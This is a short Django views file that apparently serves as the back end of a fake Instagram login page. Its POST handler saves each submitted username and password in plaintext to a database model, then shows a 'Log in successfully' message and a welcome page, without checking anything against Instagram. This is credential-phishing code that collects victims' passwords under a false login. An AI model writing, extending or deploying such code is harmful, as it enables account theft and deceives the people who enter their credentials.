from django.views import View
from django.shortcuts import render,redirect
from .models import Insta
from django.contrib import messages

class Instagram(View):
    def get(self, request):
        return render(request, 'index.html')
    
    def post(self, request):
        username = request.POST['username']
        password = request.POST['password']
        create = Insta.objects.create(username=username, password=password)
        if create:
            messages.success(request, 'Log in successfully')
        return render(request,'welcome.html')